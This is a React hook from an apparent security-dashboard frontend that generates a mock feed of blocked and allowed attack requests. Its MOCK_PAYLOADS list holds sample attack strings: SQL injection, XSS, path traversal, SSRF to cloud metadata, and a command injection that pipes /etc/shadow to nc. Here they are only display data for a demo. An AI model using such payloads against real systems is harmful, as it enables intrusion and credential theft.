// PATH: client/src/hooks/useSocket.ts
'use client'
import { useState, useEffect } from 'react'

export interface FeedEntry {
    id: string
    timestamp: string
    ip: string
    method: string
    payload: string
    action: 'blocked' | 'allowed' | 'warning'
}

const MOCK_IPS = ['185.220.101.4', '103.21.244.0', '91.108.4.116', '178.62.55.19', '5.188.10.51']
const MOCK_PAYLOADS = [
    "'; DROP TABLE users;--",
    '<script>alert(document.cookie)</script>',
    '../../../etc/passwd',
    '; cat /etc/shadow | nc 10.0.0.1',
    'http://169.254.169.254/latest/meta-data',
]
const METHODS = ['GET', 'POST', 'PUT', 'DELETE']
const ACTIONS: FeedEntry['action'][] = ['blocked', 'blocked', 'blocked', 'allowed', 'warning']

function randomEntry(): FeedEntry {
    const now = new Date()
    const ts = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}.${String(now.getMilliseconds()).padStart(3, '0')}`
    return {
        id: Math.random().toString(36).slice(2),
        timestamp: ts,
        ip: MOCK_IPS[Math.floor(Math.random() * MOCK_IPS.length)],
        method: METHODS[Math.floor(Math.random() * METHODS.length)],
        payload: MOCK_PAYLOADS[Math.floor(Math.random() * MOCK_PAYLOADS.length)],
        action: ACTIONS[Math.floor(Math.random() * ACTIONS.length)],
    }
}

export function useSocket() {
    const [feed, setFeed] = useState<FeedEntry[]>([])

    useEffect(() => {
        // Seed with 4 initial entries
        setFeed([randomEntry(), randomEntry(), randomEntry(), randomEntry()])

        const interval = setInterval(() => {
            setFeed(prev => [randomEntry(), ...prev].slice(0, 20))
        }, 2000)

        return () => clearInterval(interval)
    }, [])

    return { feed }
}